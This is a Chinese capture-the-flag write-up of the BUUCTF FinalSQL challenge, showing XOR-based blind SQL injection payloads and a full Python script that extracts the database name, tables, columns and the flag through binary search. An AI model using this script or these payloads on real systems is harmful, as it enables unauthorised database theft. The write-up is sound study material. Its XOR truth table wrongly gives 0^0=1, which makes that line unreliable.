# T13 FinalSQL

> 题目：BUUCTF [极客大挑战 2019]FinalSQL 

__0x00 审题__

> 很难说我现在这个题会与不会，只能说脚本确实不是我写的（）

打开熟悉的页面，熟悉的连续剧，不熟悉的多了五个按钮

依次打开，我们注意到在打开第五个按钮后，出题人除了内涵我们之外还提到了：

```
You are too naive!How can I give it to you? So,why not take a look at the sixth one?But where is it?
```

看来我们需要找到第六个

这里要注意：url中的id=5，我们需要把它改成id=6

  
得到
```
Clever! But not this table.
```

页面名就是flag，按照常理我们应该寻找注点，也经过注入用户名或密码后发现，他与之前不同，注点为id，但是同样存在过滤，然后发现他能用的都过滤的差不多了，还有一个^可以用

> 问题：如何用^与盲注关联

__0x01 解题__

1. 关于^的应用

```
1^1=0
0^1=1
1^0=1
0^0=1
```

* __注：相同为假，相异为真__
  
> 同理：1^1^1=1,1^0^1=0
 
我们可以用这个来检查数据库名的长度

```
?id=1^(length(database())<4)^1#
```

> 问题：关于为什么用三个去判断1^1^1=1
  
最后得到：数据库名是4

2.关于如何用ASCII码来爆出库名，表名和字段名

附一段大佬源码

```python
import requests
import sys
import time
 
#判断数据库名长度
def get_DBlen(url):
    for i in range(1,10):
        db_url = url+"1^1^(length(database())=%d)#"%i
        r = requests.get(db_url)
        if "Click" in r.text:
            print("数据库名称的长度为:%d"%i)
            return i
#爆数据库名
def get_DBname(url,length):
    DBname = ""
    length = length + 1
    for i in range(1,length):
        Max = 122
        Min = 41
        Mid = (Max+Min)//2
        while Min <= Max:
            db_url = url+"1^1^(ascii(substr(database(),%d,1))>=%d)#"%(i,Mid)
            r = requests.get(db_url)
            if "Click" in r.text:
                Min=Mid+1
                Mid=(Min+Max)//2
                pass
            else:
                Max = Mid-1
                Mid = (Min+Max)//2
                pass
            pass
        DBname = DBname + chr(Mid)
    print("数据库名:",DBname)
    return DBname
 
def get_TBname(url):
    name=""
    i = 0
    print("字段内容为：")
    while True:
        i = i+1
        Max = 128
        Min = 32
        Mid = (Max+Min)//2
        while Min <= Max:
            # 爆表名
            # db_url = url+"1^1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))>=%d)#"%(i,Mid)
            # 爆字段名
            # db_url = url+"1^1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>=%d)#"%(i,Mid)
            # 获取flag
            db_url = url+"1^1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>=%d)"%(i,Mid)
            r = requests.get(db_url)
            if "Click" in r.text:
                Min=Mid+1
                Mid=(Min+Max)//2
                pass
            else:
                Max=Mid-1
                Mid=(Min+Max)//2
                pass
            pass
        name=name+chr(Mid)
        if Mid == 31:
            break
        print(name)
    #速度太快显示不完全
        time.sleep(0.5)
 
 
if __name__=="__main__":
    url = ""
    db_Len = get_DBlen(url)
    db_Name = get_DBname(url,db_Len)
    tb_name = get_TBname(url)
```

[详情](https://blog.csdn.net/qq_52907838/article/details/119145599)

__0x02 总结__

> 确实自己没有啥思路，直接记录问题（大概会解决）

1. 关于通过ASCII如何得到我们想要的数据
2. 关于得到数据过程中二分法的应用
3. 关于我何时自己写脚本（），写的还得能跑（）
